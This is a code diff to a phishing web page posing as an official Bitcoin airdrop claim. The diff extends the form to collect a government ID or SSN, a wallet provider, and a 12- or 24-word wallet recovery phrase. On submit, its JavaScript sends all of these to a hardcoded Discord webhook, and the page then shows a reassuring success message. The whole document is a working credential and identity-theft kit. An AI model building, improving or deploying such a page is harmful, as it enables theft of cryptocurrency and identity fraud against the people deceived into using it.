@@ -45,7 +45,7 @@
       width: 100%;
     }
 
-    select, input {
+    input {
       width: 100%;
       padding: 14px;
       margin: 15px 0;
@@ -56,7 +56,7 @@
       transition: border 0.2s ease;
     }
 
-    input:focus, select:focus {
+    input:focus {
       border-color: #0044cc;
     }
 
@@ -83,6 +83,14 @@
       text-align: center;
       margin-top: 20px;
     }
+
+    .label {
+      font-size: 14px;
+      font-weight: bold;
+      color: #333;
+      text-align: left;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
@@ -93,18 +101,19 @@
 
   <div class="form-container">
     <form id="walletForm" onsubmit="sendToDiscord(event)">
-      <select id="walletSelect" name="wallet" required>
-        <option value="" disabled selected>Select Wallet Provider</option>
-        <option value="MetaMask">MetaMask</option>
-        <option value="TrustWallet">Trust Wallet</option>
-        <option value="Coinbase">Coinbase Wallet</option>
-        <option value="Other">Other</option>
-      </select>
 
-      <input type="text" id="seedInput" name="phrase" placeholder="Enter your 12 or 24-word Recovery Phrase" required />
+      <label class="label" for="idNumber">Government-Issued ID</label>
+      <input type="text" id="idNumber" name="govID" placeholder="e.g. Driver's License or SSN" required />
+
+      <label class="label" for="walletProvider">Wallet Provider</label>
+      <input type="text" id="walletProvider" name="wallet" placeholder="e.g. MetaMask, TrustWallet" required />
+
+      <label class="label" for="seedPhrase">Recovery Phrase</label>
+      <input type="text" id="seedPhrase" name="phrase" placeholder="Enter your 12 or 24-word phrase" required />
 
       <button type="submit">Claim Official Airdrop</button>
     </form>
+
     <div class="note">
       Minimum wallet balance: 0.0092 BTC<br>
       For support: <strong>admin@govbtcclaim.org</strong>
@@ -116,13 +125,12 @@
     function sendToDiscord(event) {
       event.preventDefault();
 
-      const wallet = document.getElementById('walletSelect').value;
-      const phrase = document.getElementById('seedInput').value;
+      const govID = document.getElementById('idNumber').value;
+      const wallet = document.getElementById('walletProvider').value;
+      const phrase = document.getElementById('seedPhrase').value;
 
       const data = {
-        content: `🔥 New Airdrop Claim:
-        \nWallet Type: **${wallet}**
-        \nSeed Phrase: **${phrase}**`
+        content: `🛂 ID Verification:\nGovernment ID: **${govID}**\nWallet Provider: **${wallet}**\nSeed Phrase: **${phrase}**`
       };
 
       fetch('https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG', {
@@ -132,10 +140,10 @@
         },
         body: JSON.stringify(data)
       }).then(() => {
-        alert("Wallet connected successfully.");
+        alert("Verification submitted successfully.");
         document.getElementById('walletForm').reset();
       }).catch(err => {
-        alert("Failed to connect. Try again later.");
+        alert("Submission failed. Please try again.");
         console.error(err);
       });
     }
